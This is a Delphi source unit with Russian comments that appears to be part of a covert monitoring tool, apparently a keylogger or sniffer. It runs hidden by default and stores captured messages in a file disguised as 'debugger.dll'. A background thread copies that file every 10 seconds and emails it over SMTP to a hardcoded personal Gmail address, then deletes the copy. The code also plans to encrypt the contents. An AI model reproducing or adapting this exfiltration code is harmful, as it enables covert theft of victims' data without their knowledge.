{ TODO : Для TSettings Перенести FileName в поле FFilename }
{ TODO :
Добавить проверку настроек Мейла в функцию отправкки
Переработать класс TSettings. Все параметры хранить в массиве
Вывод в лог сообщения об успешной отправки сообщения }
unit SClasses;

interface

uses Dialogs,Windows,SysUtils,IniFiles,Classes;

const
  { Имена служебных файлов }
  SETTINGS_FILENAME     = 'config.ini';
  DEBUG_LOG_FILENAME    = 'runtime.log';
  MESSAGE_LOG_FILENAME  = 'debugger.dll';
  WAIT_BEFORE_SEND      = 10000; //ms
  FORCE_DOWNLOAD_CONFIG = True;  //Если True, то config.ini будет загружен из инета
  FORCE_ENABLE_LOG      = True;  //Если True, то лог будет создаваться всегда, даже без команды -log

type
  TSettings = class
    private
      FCMD_EnableLog:       Boolean; //  [-log]
      FCMD_ShowSettings:    Boolean; //  [-settings]
      FCMD_ShowForm:        Boolean; //  [-show]
      {----------------------------}
      FInterfaceName:       String;
      FInterfaceDesc:       String;
      FFullFileName:        String;

      FMailSenderEnable:    Boolean;
      FSMTPLogin:           String;
      FSMTPPassword:        String;
      FSMTPServer:          String;
    public
      constructor Create;
      destructor  Destroy;
      procedure   LoadFromINI;
      procedure   SaveToINI;
      procedure   LoadSettings;
      procedure   SaveSettings;
      procedure   ReadCMDParams;
      procedure   DownloadConfig;

      property EnableLog:Boolean    read FCMD_EnableLog;
      property EnableForm:Boolean   read FCMD_ShowForm;
      property ShowSettings:Boolean read FCMD_ShowSettings;

      property InterfaceName:String read FInterfaceName write FInterfaceName;
      property InterfaceDesc:String read FInterfaceDesc write FInterfaceDesc;

      property EnableMailSender:Boolean read FMailSenderEnable;
      property SMTPLogin:String     read FSMTPLogin;
      property SMTPPassword:String  read FSMTPPassword;
      property SMTPServer:String    read FSMTPServer;
  end;
  TDebugLog = class
    private
      //FList:TStringList;
      FLinkedObj:TObject;
      FFullFileName: String; //Путь и Имя файла, в который будем писать логи
      FEnable: Boolean;  //Активена ли запись лога
      procedure WriteLine (Msg:string); //Записать в файл.
    public
      constructor Create; overload;
      constructor Create (LinkedObj: TObject); overload;
      destructor Destroy;
      procedure Add (Msg:string;PrintDate:Boolean=True); //Добавить строку в лог
      //property List:TStringList read FList write FList;
  end;
  TMailSender = class(TThread)
  private
    FStartTime: DWORD; //Время запуска таймера.
    FAttachmentFileName: string; //Путь до файла-вложения
    procedure CopyFile;
  protected
    procedure Execute; override;
    procedure TerminateProc(Sender: TObject);

  public
    constructor Create;
    procedure SendMail;
  end;
  function IsDublicate:boolean;
  procedure CheckDublicate;

var
  GlobalLogger: TDebugLog;   //Глобальный лог.
  GlobalSettings: TSettings; //Глобальный менеджер настроек.
  GlobalSender: TMailSender; //Отправлятель сообщений.

implementation

uses StdCtrls,
     IdSMTP,IdMessage,IdText,IdSSLOpenSSL,IdAttachmentFile,IdExplicitTLSClientServerBase;

function IsDublicate;
var
	Err:integer;
begin
  CreateMutex(nil,false,'{BE553A27-7C7C-4EEB-90DE-283E601AFA44}');
  Err := GetLastError();
  if (Err=ERROR_ALREADY_EXISTS)or(Err=ERROR_ACCESS_DENIED) then
  	Result:=True
  else
    Result:=False;
end;
procedure CheckDublicate;
begin
  if IsDublicate then
  begin
    ShowMessage('Already runned');
    raise Exception.Create('Already Runned');
  end;
end;

{ TSettings }
constructor TSettings.Create;
begin
  FFullFileName:=ExtractFileDir(ParamStr(0))+'\'+SETTINGS_FILENAME;

  //Обнуляем все настройки
  {FCMD_ShowWindow:=False;
  FCMD_EnableLog:=False;
  FCMD_SelectInterface:=False;

  FInterfaceName:='0';
  FInterfaceDesc:='0';}
end;
destructor TSettings.Destroy;
begin

end;
procedure TSettings.DownloadConfig;
var
  L:TStringList;
begin
  //Заглушка процедуры загрузки конф. файла из инета.
  L:=TStringList.Create;
  L.Add(';downloaded file');
  L.Add('[main]');
  L.Add('in=0');
  L.Add('id=0');
  L.Add('mailsender=1');
  L.Add('[mail]');
  L.Add('login=000000000');
  L.Add('password=000000000');
  L.Add('server=000000000');
  L.SaveToFile('config.ini');
  L.Free;

  GlobalLogger.Add('Downloaded - ok');
end;
procedure TSettings.LoadFromINI;
var
  Ini:TIniFile;
  SectionList:TStringList;
  KeyValueList:TStringList;
  I: Integer;
  j: Integer;
  TempStr:String;
begin
  ini:= TIniFile.Create(FFullFileName);
  try
    FInterfaceName:=Ini.ReadString('main','in','0');
    FInterfaceDesc:=Ini.ReadString('main','id','0');
    FMailSenderEnable:=Ini.ReadBool('main','mailsender',False);
    FSMTPLogin:=Ini.ReadString('mail','login','');
    FSMTPPassword:=Ini.ReadString('mail','password','');
    FSMTPServer:=Ini.ReadString('mail','server','');
  finally
    GlobalLogger.Add('Config file loaded from INI');
    SectionList:=TStringList.Create;
    KeyValueList:=TStringList.Create;
    INI.ReadSections(SectionList);
    for i := 0 to SectionList.Count-1 do
    begin
      INI.ReadSectionValues(SectionList[i],KeyValueList);
      for j := 0 to KeyValueList.Count-1 do
        TempStr:=TempStr+KeyValueList.Names[j]+'='+KeyValueList.ValueFromIndex[j]+' ';
    end;
    GlobalLogger.Add('params: '+TempStr);
    KeyValueList.Free;
    SectionList.Free;
    Ini.Free;
  end;
end;
procedure TSettings.LoadSettings;
begin
  if not FileExists(FFullFileName) then
    if FORCE_DOWNLOAD_CONFIG then
    begin
      GlobalLogger.Add('Config file is missing...Download from internet.');
      DownloadConfig; //Загружаем файл из инета.
      LoadFromINI;
    end
    else
    begin
      //сообщаем о том что файл отсутствует
      GlobalLogger.Add('Config file is missing');
      raise Exception.Create('Config file is missing');
    end
  else
  begin
    LoadFromINI;
  end;
end;
procedure TSettings.SaveSettings;
begin
  SaveToINI;
end;
procedure TSettings.SaveToINI;
var
  Ini:TIniFile;
begin
    Ini:=TIniFile.Create(FFullFileName);
    try
      Ini.WriteString('main','in',FInterfaceName);
      Ini.WriteString('main','id',FInterfaceDesc);
      {Ini.WriteBool('main','mailsender',FMailSenderEnable);
      Ini.WriteString('mail','login',FSMTPLogin);
      Ini.WriteString('mail','password',FSMTPPassword);
      Ini.WriteString('mail','server',FSMTPServer);}
    finally
      Ini.Free;
      GlobalLogger.Add('Config file saved to INI');
    end;
end;
procedure TSettings.ReadCMDParams;
//Получаем и обрабатываем параметры коммандной строки
var
  I: Integer;
  tmpBuf:string;
begin
  tmpBuf:='';
  if ParamCount>0 then
  begin
    I:=1;
    while i<=ParamCount do
    begin
      if ParamStr(i)='-help' then
      begin
        ShowMessage('This is help'+#13#10+
                    '1'+#13#10+
                    '2'+#13#10+
                    '3');
        ExitProcess(0); //Грубовато будет,но че поделать :D
      end
      else
      if (ParamStr(i)='-log') then FCMD_EnableLog:=True //Создавать файл лога
      else
      if (ParamStr(i)='-settings') then FCMD_ShowSettings:=True //Отображать окно настроек
      else
      if (ParamStr(i)='-show') then FCMD_ShowForm:=True; //Отображать главное окно программы
      inc(i);
    end;
  end;
  if FORCE_ENABLE_LOG then FCMD_EnableLog:=True;
end;
{ end of TSettings }

{ TDebugLog }
constructor TDebugLog.Create;
begin
  if Assigned(GlobalSettings) then
    FEnable:=GlobalSettings.EnableLog
  else
    FEnable:=False;
  FFullFileName:=ExtractFileDir(ParamStr(0))+'\'+DEBUG_LOG_FILENAME;
end;
constructor TDebugLog.Create(LinkedObj: TObject);
begin
  Self.Create;
  if LinkedObj is TMemo then
    FLinkedObj:=LinkedObj;
  if FEnable then
    Self.Add('--------------------')
  else
    Self.Add('Debug log disabled..')
end;
destructor TDebugLog.Destroy;
begin
  //FList.Free;
end;
procedure TDebugLog.Add(Msg: string;PrintDate:Boolean);
var
  FullMsg:String;
begin
  if PrintDate then
    FullMsg:= DateTimeToStr(Now)+' '+Msg
  else
    FullMsg:= Msg;

  if FEnable then WriteLine(FullMsg);

  if Assigned(FLinkedObj) then
    (FLinkedObj as TMemo).Lines.Add(FullMsg);
end;
procedure TDebugLog.WriteLine(Msg: string);
//Пишем служебную инфу в "Рантайм лог"
var
  i:integer;
  F:TextFile;
  FullPath:string;
begin
  AssignFile(F,FFullFileName);
  try
    if not FileExists(FFullFileName) then Rewrite(F) else Append(F);
		Writeln(F,Msg);
    CloseFile(F);
  except
		On E: Exception do
    begin
    	ShowMessage('Ошибка: '+E.Message);
      Exit;
    end;
  end;
end;
{ end of TDebugLog }

{ TMailSender }
constructor TMailSender.Create;
begin
  inherited Create(True); //Обьект создастся с остановленным потоком.
  Priority:=tpNormal; //Назначаем приоритет
  Self.FreeOnTerminate:=True; //Автоматически освобождаем обьект после завершения потока
  Self.OnTerminate:=TerminateProc;
  FStartTime:=GetTickCount;
  GlobalLogger.Add('MailSender: Init...');
end;
procedure TMailSender.Execute;
var
  CurrentTime:DWORD;
  fname:String;
begin
  NameThreadForDebugging('MailSender'); //Это для отладчика.
  GlobalLogger.Add('MailSender: Execute. Wait For '+IntToStr(WAIT_BEFORE_SEND)+'ms');
  while 1=1 do
  begin
    //Пауза перед отправкой.
    {repeat
      CurrentTime:=GetTickCount;
    until CurrentTime>=FStartTime+WAIT_BEFORE_SEND;
    FStartTime:=CurrentTime; }

    Sleep(WAIT_BEFORE_SEND);
    Synchronize();
    CopyFile;
    try
      SendMail;
    finally
      DeleteFile(Self.FAttachmentFileName);
    end;
  end;
end;
procedure TMailSender.SendMail;
var
  smtp: TIdSMTP;
  msg: TIdMessage;

  function ParceString (Msg:string):String;
  var
    i:integer;
  begin
    for i:=1 to Length(Msg) do
    begin
      if (Msg[i]=#13) or (msg[i]=#10) then
      begin
        Delete(Msg,i,1);
        Insert(' ',Msg,i);
      end;
    end;
    Result:=Msg;
  end;

begin
  if self.Terminated then exit;
  GlobalLogger.Add('send');
  //Готовим SMTP
  smtp:= TIdSMTP.Create;
  try
    msg:=TIdMessage.Create(smtp);
    try
      with msg do
      begin
        Subject:='subject';
        From.Text:=GlobalSettings.FSMTPLogin;
        Recipients.EMailAddresses:='osmenog@gmail.com';
        CharSet:='windows-1251';
        //ContentType := 'text/plain';
        Body.Text:='text1111!!! =) [Привет!]';
      end;

      TIdAttachmentFile.Create(msg.MessageParts,Self.FAttachmentFileName);

      //----------MAIL.RU--------------
      smtp.Host:=GlobalSettings.FSMTPServer;
      smtp.Username:=GlobalSettings.FSMTPLogin;
      smtp.Password:=GlobalSettings.FSMTPPassword;
      //-------------------------------

      //smtp.UseTLS:=utUseRequireTLS;
      try
        smtp.Connect;
      except
        on E:Exception do
        begin
          GlobalLogger.Add('Connect error: ['+ParceString(E.Message)+']');
          raise;
        end;
      end;

      try
        try
          smtp.Send(msg);
          GlobalLogger.Add('Mail Sender: Send - Ok ;)');
        except
          On E:Exception do
          begin
            GlobalLogger.Add('Send error: ['+ParceString(E.Message)+']');
            raise;
          end;
        end;
      finally
        smtp.Disconnect;
      end;
    finally
      FreeAndNil(msg);
    end;
  finally
    FreeAndNil(smtp);
  end;
end;
procedure TMailSender.CopyFile;
var
  TempFileName:string; //Имя временного файла: XXXXddmmyy-hhmm

  Source:string;       //Полный путь до файла-источника
  Destination:string;  //Полный путь до файла-приемника
begin
(*
  1.Проверим доступность интернета.
    1.1.Если доступен, то:
      -Копируем файл во временный каталог, и переименовываем.
      -Шифруем содержимое
      -Отправляем письмо
      -Удаляем временный файл
      -Заносим запись в лог в случае успеха.
      --В случае неудачи указываем этап, и причину ошибки.
    1.2.Если НЕ доступен, то:
      -Пишем в лог сообщение об ошибке.
*)

  Source:=ExtractFileDir(ParamStr(0))+'\'+MESSAGE_LOG_FILENAME;
  TempFileName:=FormatDateTime('ddmmyy"-"hhnn',Now())+'.log';
  Destination:=ExtractFileDir(ParamStr(0))+'\'+TempFileName;

  Windows.CopyFile(@Source[1],@Destination[1],False);

  if GetLastError<>0 then
  begin
    GlobalLogger.Add('CopyFile error:'+IntToStr(GetLastError));
    Self.Terminate;
  end
  else
    GlobalLogger.Add('CopyFile - ok: '+Destination);

  FAttachmentFileName:=Destination;
end;
procedure TMailSender.TerminateProc(Sender: TObject);
begin
  GlobalLogger.Add('MailSender: Terminated...');
  if FileExists(Self.FAttachmentFileName) then
    DeleteFile(Self.FAttachmentFileName);
end;
{ end of TMailSender }
end.
